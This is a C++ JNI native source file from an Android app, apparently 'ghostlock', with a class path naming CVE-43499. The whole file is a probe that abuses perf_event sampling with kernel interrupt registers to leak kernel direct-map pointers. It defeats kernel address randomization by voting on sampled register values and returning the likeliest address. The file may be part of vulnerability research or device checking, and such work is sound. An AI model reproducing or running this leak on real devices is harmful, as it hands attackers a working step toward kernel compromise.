#include <jni.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <cstdint>
#include <cstring>
#include <unordered_map>

namespace {
    constexpr std::uint64_t kDirectMapBegin = 0xffffff8000000000ULL;
    std::uint64_t vote_from_ring(void *ring, long page, std::uint64_t head) {
        std::unordered_map<std::uint64_t, int> votes;
        const auto *base = static_cast<const unsigned char *>(ring) + page;
        const std::size_t data_size = static_cast<std::size_t>(page) * 8U;
        std::uint64_t pos = 0;
        while (pos + 8U <= head) {
            const std::size_t off = static_cast<std::size_t>(pos % data_size);
            perf_event_header h{};
            std::memcpy(&h, base + off, sizeof(h));
            if (h.size == 0U || pos + h.size > head) break;
            if (h.type == PERF_RECORD_SAMPLE && h.size >= 8U + 16U) {
                const unsigned char *p = base + off + 8U;
                std::uint64_t ip = 0U, abi = 0U;
                std::memcpy(&ip, p, 8U); p += 8U;
                std::memcpy(&abi, p, 8U); p += 8U;
                if (abi == 1U || abi == 2U) {
                    for (int i = 0; i < 32 && p + 8U <= base + off + h.size; ++i) {
                        std::uint64_t reg = 0U; std::memcpy(&reg, p, 8U); p += 8U;
                        const std::uint64_t canonical = reg | 0x0f00000000000000ULL;
                        if (canonical > kDirectMapBegin) ++votes[canonical];
                    }
                }
            }
            pos += h.size;
        }
        std::uint64_t best = 0U; int best_count = 0;
        for (const auto &entry : votes) {
            if (entry.second > best_count) { best = entry.first; best_count = entry.second; }
        }
        return best_count >= 2 ? best : 0U;
    }
}  // namespace

extern "C" JNIEXPORT jlong JNICALL
Java_com_ghostlock_app_jni_cve43499_NativePerfTaskProbe_probe(JNIEnv *, jclass) {
    perf_event_attr attr{};
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.sample_period = 5000U;
    attr.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    attr.sample_regs_intr = 0xffffffffULL;
    attr.disabled = 1;
    attr.exclude_kernel = 0;
    attr.exclude_user = 0;
    attr.wakeup_events = 1;
    const int fd = static_cast<int>(::syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0));
    if (fd < 0) return 0;
    const long page = ::sysconf(_SC_PAGESIZE);
    const std::size_t ring_len = static_cast<std::size_t>(page) * 9U;
    void *ring = ::mmap(nullptr, ring_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (ring == MAP_FAILED) { ::close(fd); return 0; }
    (void)::ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    (void)::ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (volatile int i = 0; i < 50000000; ++i) {}
    (void)::ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    auto *meta = static_cast<perf_event_mmap_page *>(ring);
    const std::uint64_t answer = vote_from_ring(ring, page, meta->data_head);
    ::munmap(ring, ring_len);
    ::close(fd);
    return static_cast<jlong>(answer);
}
